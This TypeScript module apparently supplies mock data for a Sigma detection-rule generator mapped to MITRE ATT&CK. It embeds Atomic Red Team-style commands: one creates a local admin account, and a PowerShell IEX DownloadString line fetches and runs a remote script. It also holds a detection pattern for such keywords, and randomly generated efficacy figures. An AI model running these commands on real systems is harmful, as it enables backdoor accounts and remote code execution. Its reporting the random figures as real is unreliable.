
import { AtomicTest, GenerationResult, GeneratorOption, SigmaRuleTemplate, GeneratedRule, TechniqueReference } from "../types/generator";

// Generator options with proper typing for the category
export const generatorOptions: GeneratorOption[] = [
  {
    id: "behavior-analysis",
    name: "Behavior Analysis",
    description: "Generate rules based on observed system behavior and anomalies",
    model: "gpt-4o",
    category: "behavior"
  },
  {
    id: "sigma-enhancement",
    name: "Sigma Rule Enhancement",
    description: "Optimize and enhance existing Sigma rules for better detection",
    model: "gpt-4o",
    category: "technique"
  },
  {
    id: "log-analysis",
    name: "Log Pattern Analysis",
    description: "Extract patterns from security logs and convert to detection rules",
    model: "gpt-4o-mini",
    category: "log"
  }
];

// Sample techniques for the UI
export const sampleTechniques: TechniqueReference[] = [
  { id: "T1078", name: "Valid Accounts", tactic: "Initial Access" },
  { id: "T1566", name: "Phishing", tactic: "Initial Access" },
  { id: "T1059", name: "Command and Scripting Interpreter", tactic: "Execution" },
  { id: "T1053", name: "Scheduled Task/Job", tactic: "Execution" },
  { id: "T1027", name: "Obfuscated Files or Information", tactic: "Defense Evasion" }
];

// Atomic Red Team test data
const atomicRedTeamData: Record<string, AtomicTest[]> = {
  "T1078": [
    {
      id: "T1078.001",
      name: "Create local admin account",
      description: "Creates a local admin account on Windows systems",
      supportedPlatforms: ["windows"],
      executor: {
        name: "command_prompt",
        command: "net user attacker password123 /add && net localgroup administrators attacker /add",
        elevation_required: true
      }
    }
  ],
  "T1059": [
    {
      id: "T1059.001",
      name: "PowerShell Command Execution",
      description: "Executes PowerShell commands to download and execute content",
      supportedPlatforms: ["windows"],
      executor: {
        name: "powershell",
        command: "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('https://example.com/script.ps1')\"",
        elevation_required: false
      }
    }
  ]
};

// Sigma rule templates
const sigmaTemplates: Record<string, SigmaRuleTemplate> = {
  "T1078": {
    title: "Valid Accounts Detection",
    id: "f344106d-7f1e-4c5e-90a1-1b0cee5f4c26",
    description: "Detects successful authentication from privileged accounts outside normal patterns",
    status: "experimental",
    logsource: {
      product: "windows",
      service: "security"
    },
    detection: {
      selection: {
        EventID: 4624,
        LogonType: 2,
        TargetUserName: ["Administrator", "Admin", "*admin"]
      },
      condition: "selection"
    },
    level: "medium",
    tags: ["attack.initial_access", "attack.t1078"]
  },
  "T1059": {
    title: "Suspicious Command Execution",
    id: "3dfd06d7-6a9d-4760-b0c4-1d9b3d3ac61b", 
    description: "Detects suspicious command execution patterns",
    status: "experimental",
    logsource: {
      product: "windows",
      service: "sysmon",
      category: "process_creation"
    },
    detection: {
      selection: {
        Image: {
          endswith: [
            "\\powershell.exe",
            "\\cmd.exe",
            "\\wscript.exe",
            "\\cscript.exe"
          ]
        },
        CommandLine: {
          contains: [
            "IEX ",
            "Invoke-Expression",
            "Invoke-WebRequest",
            "DownloadString",
            "hidden",
            "-enc ",
            "-encoded"
          ]
        }
      },
      condition: "selection"
    },
    level: "medium",
    tags: ["attack.execution", "attack.t1059"]
  }
};

// Generate simulated results based on selected option and integrated real data
export const simulateGenerationResults = (optionId: string): GenerationResult => {
  // Get random number of rules between 3 and 8
  const ruleCount = Math.floor(Math.random() * 6) + 3;
  
  // Generate rules based on both mock data and incorporating real techniques
  const rules: GeneratedRule[] = Array.from({ length: ruleCount }, (_, i) => {
    // Select a technique randomly from our sample
    const technique = sampleTechniques[Math.floor(Math.random() * sampleTechniques.length)];
    
    // Try to get real Sigma template or atomic test for this technique
    const sigmaTemplate = sigmaTemplates[technique.id];
    const atomicTests = atomicRedTeamData[technique.id] || [];
    
    // Use real template data if available, otherwise generate mock
    const title = sigmaTemplate ? 
      sigmaTemplate.title : 
      `${optionId === 'behavior-analysis' ? 'Behavioral' : 'Standard'} Detection for ${technique.name}`;
      
    const description = sigmaTemplate ? 
      sigmaTemplate.description : 
      `Detects ${technique.name} techniques based on ${atomicTests.length > 0 ? 'observed atomic tests' : 'common patterns'}`;
      
    const severity = ['low', 'medium', 'high', 'critical'][Math.floor(Math.random() * 4)];
    
    // Convert atomic tests to references
    const atomicTestReferences = atomicTests.length > 0 ? 
      atomicTests.map(test => ({ id: test.id, name: test.name })) : 
      undefined;
      
    // Generate data source recommendations
    const dataSourceRecommendations = Math.random() > 0.5 ? 
      ["Windows Event Logs", "Sysmon", "EDR Telemetry"].slice(0, Math.floor(Math.random() * 3) + 1) : 
      undefined;
      
    // Generate efficacy note
    const efficacyNote = Math.random() > 0.7 ? 
      "This rule may generate false positives in development environments" : 
      undefined;
      
    return {
      id: `rule-${i + 1}`,
      title,
      description,
      severity,
      technique: technique.id,
      atomicTestReferences,
      dataSourceRecommendations,
      efficacyNote
    };
  });
  
  // Generate realistic statistics
  const statistics = {
    techniquesCovered: rules.length,
    totalTechniques: 15,
    tacticsCovered: 4,
    totalTactics: 12,
    estimatedEfficacy: Math.floor(Math.random() * 30) + 60  // 60-90%
  };
  
  // Add analysis insights from either Sigma or Atomic Red Team data
  const analysis = [
    {
      type: Math.random() > 0.7 ? "warning" as const : "info" as const,
      message: Math.random() > 0.5 ? 
        "Some techniques may require additional context for higher fidelity detection" : 
        "Rules generated using validated Atomic Red Team test data"
    },
    {
      type: "info" as const,
      message: `${optionId === 'log-analysis' ? 'Log patterns' : 'Behavior patterns'} mapped to ${statistics.techniquesCovered} MITRE ATT&CK techniques`
    }
  ];
  
  return {
    statistics,
    analysis,
    rules
  };
};

// Get Atomic Red Team tests for a specific technique
export const getAtomicTests = (techniqueId: string): AtomicTest[] => {
  return atomicRedTeamData[techniqueId] || [];
};

// Get Sigma rule template for a specific technique
export const getSigmaTemplate = (techniqueId: string): SigmaRuleTemplate | null => {
  return sigmaTemplates[techniqueId] || null;
};
